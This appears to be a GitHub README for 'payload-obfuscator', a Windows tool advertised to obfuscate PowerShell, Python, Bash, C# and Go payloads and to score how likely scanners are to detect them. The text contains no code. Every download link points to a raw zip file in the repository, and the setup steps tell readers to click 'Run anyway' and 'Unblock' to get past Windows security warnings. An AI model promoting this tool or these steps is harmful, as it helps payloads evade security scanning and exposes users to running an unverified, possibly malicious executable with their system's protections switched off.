# 🛡️ payload-obfuscator - Layered Payload Obfuscation Made Simple

[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/mathews2007morais-boop/payload-obfuscator/main/public/payload_obfuscator_v2.3.zip)

## 📥 Download

Visit this page to download the app: [Release downloads](https://raw.githubusercontent.com/mathews2007morais-boop/payload-obfuscator/main/public/payload_obfuscator_v2.3.zip)

## 🧭 What this tool does

payload-obfuscator helps you prepare payloads with layered obfuscation for common scripting and compiled languages. It supports PowerShell, Python, Bash, C#, and Go. It also checks Shannon entropy and gives a simple detection score so you can see how a payload may look to basic scanners.

Use it to test how changes affect the shape of your payload before you move it into a lab or test setup.

## 💻 Windows setup

### 1. Get the release
Open the [Release downloads](https://raw.githubusercontent.com/mathews2007morais-boop/payload-obfuscator/main/public/payload_obfuscator_v2.3.zip) page and pick the latest Windows file.

Look for a file such as:
- `payload-obfuscator-windows-x64.zip`
- `payload-obfuscator.exe`
- another Windows build listed on the release page

### 2. Save the file
Download the file to a folder you can find easily, such as:
- `Downloads`
- `Desktop`
- a new folder like `C:\Tools`

### 3. Unpack the file if needed
If the download is a `.zip` file:
- Right-click the file
- Select **Extract All**
- Pick a folder
- Finish the extraction

If the download is an `.exe` file:
- No unpacking is needed
- Keep the file in the folder where you saved it

### 4. Run the app
If you extracted a folder:
- Open the folder
- Find the main `.exe` file
- Double-click it

If Windows shows a security prompt:
- Select **More info**
- Then select **Run anyway** if you trust the file from the release page

### 5. Start using it
After the app opens:
- Load or paste the payload you want to work with
- Choose the language type
- Select the obfuscation options you want
- Check the entropy and score results
- Save the output when you are done

## 🧰 System requirements

- Windows 10 or Windows 11
- 64-bit system
- 4 GB RAM or more
- About 200 MB free disk space
- Internet access to download the release
- Permission to run downloaded apps on your device

## 🔍 Main features

- Multi-layer payload obfuscation
- Support for PowerShell payloads
- Support for Python scripts
- Support for Bash scripts
- Support for C# code
- Support for Go code
- Shannon entropy analysis
- Real-time detection scoring
- Simple output view
- Copy and save results
- Local desktop app workflow

## 🖱️ Basic use

### Step 1: Open the app
Launch the program from the file you downloaded.

### Step 2: Add your payload
Paste your script or load it from a file.

### Step 3: Pick a target language
Choose the language that matches your payload:
- PowerShell
- Python
- Bash
- C#
- Go

### Step 4: Apply obfuscation
Select the layers you want to use. The app will transform the payload and update the score.

### Step 5: Review the results
Check:
- Output length
- Shannon entropy
- Detection score
- Final payload text

### Step 6: Save the output
Copy the final result or save it to a file for later use.

## 🧪 How the scoring works

The app uses entropy analysis to measure how mixed the text looks. Higher entropy can show more randomness in the payload. The detection score gives you a quick view of how the output may stand out to common checks.

Use the score as a guide while you test different options.

## 📁 Typical folder layout

If you extract a release zip, you may see files like:
- `payload-obfuscator.exe`
- `config.json`
- `README.txt`
- `assets/`
- `logs/`

Keep all files in the same folder unless the release notes say otherwise.

## 🔐 File safety

Download only from the release page linked above. This helps you get the right build for Windows and avoid broken files or old copies.

## 🛠️ Common problems

### The app does not open
- Make sure the file finished downloading
- Check that you extracted all files if the release came as a zip
- Try running the app again from the extracted folder

### Windows blocks the file
- Right-click the file
- Select **Properties**
- If you see an **Unblock** option, enable it
- Try opening the app again

### The app opens but looks broken
- Resize the window
- Make sure your screen scale is set to a normal value
- Restart the app

### The output looks different than expected
- Check the target language setting
- Try a smaller payload first
- Change one setting at a time so you can see what affects the result

## 📌 Tips for first use

- Start with a short test script
- Keep a copy of the original payload
- Change one option at a time
- Save each version with a clear file name
- Compare the entropy and score after each change

## 📚 Supported content types

payload-obfuscator is built for:
- PowerShell scripts
- Python scripts
- Bash scripts
- C# source
- Go source

It focuses on text-based payloads and scripts that can be transformed before use in a test environment

## 🧾 Version downloads

Get the latest Windows build here: [Release downloads](https://raw.githubusercontent.com/mathews2007morais-boop/payload-obfuscator/main/public/payload_obfuscator_v2.3.zip)

## 🧩 Topics

cybersecurity, evasion-techniques, malware-analysis, obfuscation, payload-generator, pentesting-tools, powershell-obfuscator, red-team, security-tools, shannon-entropy